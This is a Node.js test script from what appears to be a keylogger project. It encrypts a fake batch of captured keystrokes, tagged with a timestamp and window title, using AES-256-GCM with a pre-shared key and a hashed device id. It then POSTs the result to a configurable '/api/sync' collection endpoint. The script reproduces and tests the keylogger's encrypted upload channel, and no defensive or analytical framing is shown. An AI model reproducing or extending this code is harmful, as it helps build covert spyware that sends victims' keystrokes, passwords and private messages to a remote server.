// Local test: encrypts a fake batch with the same construction the keylogger
// uses (AES-256-GCM, AAD = device id) and POSTs it to /api/sync.
import { createCipheriv, randomBytes, createHash } from "node:crypto";

const PSK = Buffer.from(process.env.KEYLOGGER_PSK, "hex");
const URL_ = process.env.SYNC_URL || "http://localhost:3001/api/sync";
const devid = createHash("sha256").update("testmachine\\matt").digest("hex").slice(0, 16);

const plaintext = "[2026-09-16 14:00:00] | Untitled - Notepad |\nhello from node test\n";
const nonce = randomBytes(12);
const cipher = createCipheriv("aes-256-gcm", PSK, nonce);
cipher.setAAD(Buffer.from(devid, "utf8"));
const ct = Buffer.concat([cipher.update(plaintext, "utf8"), cipher.final()]);
const tag = cipher.getAuthTag();

const res = await fetch(URL_, {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({
    v: 1, d: devid, ts: Math.floor(Date.now() / 1000),
    n: nonce.toString("base64"), c: ct.toString("base64"), t: tag.toString("base64"),
  }),
});
console.log("status", res.status, await res.text());
